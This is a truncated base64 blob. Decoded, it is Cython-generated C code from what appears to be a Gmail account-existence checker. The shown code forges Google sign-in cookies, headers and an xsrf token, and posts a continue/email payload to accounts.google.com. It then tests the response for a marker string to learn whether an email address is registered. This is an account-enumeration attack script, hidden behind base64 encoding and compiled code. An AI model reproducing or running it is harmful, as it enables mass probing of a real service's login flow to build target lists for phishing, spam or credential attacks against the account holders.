3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc3BsaXRsaW5lcywgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDEtX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF8xMSk7IF9fcHl4X3RfMTEgPSAwO1xuICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgICAgIGlmICh1bmxpa2VseSghX19weXhfdF8xMikpIF9fUFlYX0VSUigwLCAzMTAsIF9fcHl4X0wxMl9leGNlcHRfZXJyb3IpXG4gICAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xMik7XG4gICAgICAgICAgfVxuICAgICAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9HZXRJdGVtSW50KF9fcHl4X3RfMTIsIDAsIGxvbmcsIDEsIF9fUHl4X1B5TG9uZ19Gcm9tX2xvbmcsIDAsIDAsIDEsIDEpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzEwLCBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yKVxuICAgICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMik7IF9fcHl4X3RfMTIgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUZfU0VUKF9fcHl4X3ZfbywgX19weXhfdF8xNCk7XG4gICAgICAgICAgX19weXhfdF8xNCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgICBnb3RvIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDtcbiAgICAgICAgfVxuXG4gICAgICAgIFxuICAgICAgICBfX3B5eF9MMTJfZXhjZXB0X2Vycm9yOjtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF83KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF84KTtcbiAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF85KTtcbiAgICAgICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF83LCBfX3B5eF90XzgsIF9fcHl4X3RfOSk7XG4gICAgICAgIGdvdG8gX19weXhfTDNfZXJyb3I7XG4gICAgICAgIF9fcHl4X0wxMV9leGNlcHRpb25faGFuZGxlZDo7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfNyk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOCk7XG4gICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfOSk7XG4gICAgICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfNywgX19weXhfdF84LCBfX3B5eF90XzkpO1xuICAgICAgICBfX3B5eF9MMTVfdHJ5X2VuZDo7XG4gICAgICB9XG5cbiAgICAgIFxuICAgICAgX19weXhfdF81ID0gX19weXhfdl9vO1xuICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgIHtcbiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzJdID0ge19fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9fN307XG4gICAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9zcGxpdCwgX19weXhfY2FsbGFyZ3MrX19weXhfdF8xMywgKDItX19weXhfdF8xMykgfCAoMSpfX1B5eF9QWV9WRUNUT1JDQUxMX0FSR1VNRU5UU19PRkZTRVQpKTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwO1xuICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIH1cbiAgICAgIGlmICgobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChfX3B5eF90XzYpKSkgfHwgKFB5TGlzdF9DaGVja0V4YWN0KF9fcHl4X3RfNikpKSB7XG4gICAgICAgIFB5T2JqZWN0KiBzZXF1ZW5jZSA9IF9fcHl4X3RfNjtcbiAgICAgICAgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlTZXF1ZW5jZV9TSVpFKHNlcXVlbmNlKTtcbiAgICAgICAgaWYgKHVubGlrZWx5KHNpemUgIT0gMikpIHtcbiAgICAgICAgICBpZiAoc2l6ZSA+IDIpIF9fUHl4X1JhaXNlVG9vTWFueVZhbHVlc0Vycm9yKDIpO1xuICAgICAgICAgIGVsc2UgaWYgKHNpemUgPj0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKHNpemUpO1xuICAgICAgICAgIF9fUFlYX0VSUigwLCAzMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICB9XG4gICAgICAgICNpZiBDWVRIT05fQVNTVU1FX1NBRkVfTUFDUk9TICYmICFDWVRIT05fQVZPSURfQk9SUk9XRURfUkVGU1xuICAgICAgICBpZiAobGlrZWx5KFB5VHVwbGVfQ2hlY2tFeGFjdChzZXF1ZW5jZSkpKSB7XG4gICAgICAgICAgX19weXhfdF81ID0gUHlUdXBsZV9HRVRfSVRFTShzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IFB5VHVwbGVfR0VUX0lURU0oc2VxdWVuY2UsIDEpO1xuICAgICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzEwKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICBfX3B5eF90XzUgPSBfX1B5eF9QeUxpc3RfR2V0SXRlbVJlZihzZXF1ZW5jZSwgMCk7XG4gICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5TGlzdF9HZXRJdGVtUmVmKHNlcXVlbmNlLCAxKTtcbiAgICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgICB9XG4gICAgICAgICNlbHNlXG4gICAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5U2VxdWVuY2VfSVRFTShzZXF1ZW5jZSwgMCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgX19QWVhfRVJSKDAsIDMxMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzUpO1xuICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHNlcXVlbmNlLCAxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMxMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgI2VuZGlmXG4gICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgfSBlbHNlIHtcbiAgICAgICAgUHlfc3NpemVfdCBpbmRleCA9IC0xO1xuICAgICAgICBfX3B5eF90XzE0ID0gUHlPYmplY3RfR2V0SXRlcihfX3B5eF90XzYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzEyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTQpO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDtcbiAgICAgICAgX19weXhfdF8xNyA9IChDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJKSA/IFB5SXRlcl9OZXh0IDogX19QeXhfUHlPYmplY3RfR2V0SXRlck5leHRGdW5jKF9fcHl4X3RfMTQpO1xuICAgICAgICBpbmRleCA9IDA7IF9fcHl4X3RfNSA9IF9fcHl4X3RfMTcoX19weXhfdF8xNCk7IGlmICh1bmxpa2VseSghX19weXhfdF81KSkgZ290byBfX3B5eF9MMThfdW5wYWNraW5nX2ZhaWxlZDtcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIGluZGV4ID0gMTsgX19weXhfdF8xMCA9IF9fcHl4X3RfMTcoX19weXhfdF8xNCk7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIGdvdG8gX19weXhfTDE4X3VucGFja2luZ19mYWlsZWQ7XG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgICAgaWYgKF9fUHl4X0l0ZXJuZXh0VW5wYWNrRW5kQ2hlY2soX19weXhfdF8xNyhfX3B5eF90XzE0KSwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzE3ID0gTlVMTDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgZ290byBfX3B5eF9MMTlfdW5wYWNraW5nX2RvbmU7XG4gICAgICAgIF9fcHl4X0wxOF91bnBhY2tpbmdfZmFpbGVkOjtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgX19weXhfdF8xNyA9IE5VTEw7XG4gICAgICAgIGlmIChfX1B5eF9JdGVyRmluaXNoKCkgPT0gMCkgX19QeXhfUmFpc2VOZWVkTW9yZVZhbHVlc0Vycm9yKGluZGV4KTtcbiAgICAgICAgX19QWVhfRVJSKDAsIDMxMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fcHl4X0wxOV91bnBhY2tpbmdfZG9uZTo7XG4gICAgICB9XG4gICAgICBfX3B5eF92X3RsID0gX19weXhfdF81O1xuICAgICAgX19weXhfdF81ID0gMDtcbiAgICAgIF9fcHl4X3ZfaG9zdCA9IF9fcHl4X3RfMTA7XG4gICAgICBfX3B5eF90XzEwID0gMDtcblxuICAgICAgXG4gICAgICBfX3B5eF90XzYgPSBfX1B5eF9QeURpY3RfTmV3UHJlc2l6ZWQoMSk7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDMxNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF82KTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfSG9zdF9HQVBTLCBfX3B5eF92X2hvc3QpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzE1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fcHl4X3ZfY29va2llcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCg4KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzE4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2F1dGhvcml0eSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYWNjZXB0LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18zKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBpZiAoUHlEaWN0X1NldEl0ZW0oX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2FjY2VwdF9sYW5ndWFnZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9lbl9VU19lbl9xXzBfOSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9jb250ZW50X3R5cGUsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfYXBwbGljYXRpb25feF93d3dfZm9ybV91cmxlbmNvZGUpIDwgKDApKSBfX1BZWF9FUlIoMCwgMzE4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfZ29vZ2xlX2FjY291bnRzX3hzcmYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X29yaWdpbiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxOCwgX19weXhfTDNfZXJyb3IpXG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2h0dHBzX2FjY291bnRzX2dvb2dsZV9jb21fc2lnbnVwXzIsIF9fcHl4X3ZfdGwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzI0LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9yZWZlcmVyLCBfX3B5eF90XzEwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMxOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNSA9IE5VTEw7XG4gICAgICBfX1B5eF9HZXRNb2R1bGVHbG9iYWxOYW1lKF9fcHl4X3RfMTQsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9nZ2IpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzI1LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgIF9fcHl4X3RfMTMgPSAxO1xuICAgICAgI2lmIENZVEhPTl9VTlBBQ0tfTUVUSE9EU1xuICAgICAgaWYgKHVubGlrZWx5KFB5TWV0aG9kX0NoZWNrKF9fcHl4X3RfMTQpKSkge1xuICAgICAgICBfX3B5eF90XzUgPSBQeU1ldGhvZF9HRVRfU0VMRihfX3B5eF90XzE0KTtcbiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNSk7XG4gICAgICAgIFB5T2JqZWN0KiBfX3B5eF9fZnVuY3Rpb24gPSBQeU1ldGhvZF9HRVRfRlVOQ1RJT04oX19weXhfdF8xNCk7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpO1xuICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfX2Z1bmN0aW9uKTtcbiAgICAgICAgX19QeXhfREVDUkVGX1NFVChfX3B5eF90XzE0LCBfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX3B5eF90XzEzID0gMDtcbiAgICAgIH1cbiAgICAgICNlbmRpZlxuICAgICAge1xuICAgICAgICBQeU9iamVjdCAqX19weXhfY2FsbGFyZ3NbMl0gPSB7X19weXhfdF81LCBOVUxMfTtcbiAgICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgxLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7XG4gICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMyNSwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIH1cbiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfdXNlcl9hZ2VudCwgX19weXhfdF8xMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMTgsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDtcbiAgICAgIF9fcHl4X3ZfaGVhZGVycyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IF9fUHl4X1B5RGljdF9OZXdQcmVzaXplZCgxKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzI4LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X1RMLCBfX3B5eF92X3RsKSA8ICgwKSkgX19QWVhfRVJSKDAsIDMyOCwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX3B5eF92X3BhcmFtcyA9ICgoUHlPYmplY3QqKV9fcHl4X3RfNik7XG4gICAgICBfX3B5eF90XzYgPSAwO1xuXG4gICAgICBcbiAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X2NvbnRpbnVlX2h0dHBzXzNBXzJGXzJGbWFpbF9nb29nLCBfX3B5eF92X3RsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzYpKSBfX1BZWF9FUlIoMCwgMzMwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpO1xuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkNfMjIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzMwLCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgX19weXhfdF82ID0gUHlOdW1iZXJfQWRkKF9fcHl4X3RfMTAsIF9fcHl4X3ZfZW1haWwpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNikpIF9fUFlYX0VSUigwLCAzMzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNik7XG4gICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwO1xuICAgICAgX19weXhfdF8xMCA9IFB5TnVtYmVyX0FkZChfX3B5eF90XzYsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfMjJfMkMwXzJDMF8yQzFfMkNudWxsXzJDMF8yQzUxNik7IGlmICh1bmxpa2VseSghX19weXhfdF8xMCkpIF9fUFlYX0VSUigwLCAzMzAsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfMTApO1xuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7XG4gICAgICBfX3B5eF92X2RhdGEgPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF82ID0gTlVMTDtcbiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF8xNCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzE0KSkgX19QWVhfRVJSKDAsIDMzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF8xNCk7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMyA9IDE7XG4gICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTXG4gICAgICBpZiAodW5saWtlbHkoUHlNZXRob2RfQ2hlY2soX19weXhfdF8xNCkpKSB7XG4gICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfMTQpO1xuICAgICAgICBhc3NlcnQoX19weXhfdF82KTtcbiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzE0KTtcbiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNik7XG4gICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pO1xuICAgICAgICBfX1B5eF9ERUNSRUZfU0VUKF9fcHl4X3RfMTQsIF9fcHl4X19mdW5jdGlvbik7XG4gICAgICAgIF9fcHl4X3RfMTMgPSAwO1xuICAgICAgfVxuICAgICAgI2VuZGlmXG4gICAgICB7XG4gICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syICsgKChDWVRIT05fVkVDVE9SQ0FMTCkgPyA0IDogMCldID0ge19fcHl4X3RfNiwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9odHRwc19hY2NvdW50c19nb29nbGVfY29tX19fc2lnbl8yfTtcbiAgICAgICAgX19weXhfdF81ID0gX19QeXhfTWFrZVZlY3RvcmNhbGxCdWlsZGVyS3dkcyg0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzUpKSBfX1BZWF9FUlIoMCwgMzMyLCBfX3B5eF9MM19lcnJvcilcbiAgICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNSk7XG4gICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3BhcmFtcywgX19weXhfdl9wYXJhbXMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF92X2Nvb2tpZXMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMSkgPCAoMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF92X2hlYWRlcnMsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMikgPCAoMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBpZiAoX19QeXhfVmVjdG9yY2FsbEJ1aWxkZXJfQWRkQXJnKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF92X2RhdGEsIF9fcHl4X3RfNSwgX19weXhfY2FsbGFyZ3MrMiwgMykgPCAoMCkpIF9fUFlYX0VSUigwLCAzMzIsIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgICBfX3B5eF90XzEwID0gX19QeXhfT2JqZWN0X1ZlY3RvcmNhbGxfQ2FsbEZyb21CdWlsZGVyKF9fcHl4X3RfMTQsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTMsICgyLV9fcHl4X3RfMTMpIHwgKF9fcHl4X3RfMTMqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSwgX19weXhfdF81KTtcbiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwO1xuICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDtcbiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDMzMiwgX19weXhfTDNfZXJyb3IpXG4gICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIH1cbiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzEwO1xuICAgICAgX19weXhfdF8xMCA9IDA7XG5cbiAgICAgIFxuICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIoX19weXhfdl9yZXNwb25zZSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3RleHQpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTApKSBfX1BZWF9FUlIoMCwgMzM5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTtcbiAgICAgIF9fcHl4X3RfMTQgPSBfX1B5eF9QeU9iamVjdF9Vbmljb2RlKF9fcHl4X3RfMTApOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfMTQpKSBfX1BZWF9FUlIoMCwgMzM5LCBfX3B5eF9MM19lcnJvcilcbiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzE0KTtcbiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7XG4gICAgICBfX3B5eF90XzQgPSAoX19QeXhfUHlVbmljb2RlX0NvbnRhaW5zVEYoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV9nZl91YXJfMSwgX19weXhfdF8xNCwgUHlfRVEpKTsgaWYgKHVubGlrZWx5KChfX3B5eF90XzQgPCAwKSkpIF9fUFlYX0VSUigwLCAzMzksIF9fcHl4X0wzX2Vycm9yKVxuICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfMTQpOyBfX3B5eF90XzE0ID0gMDtcbiAgICAgIGlmIChfX3B5eF90XzQpIHtcblxuICAgICAgICBcbiAgICAgICAgX19QeXhfR2V0TW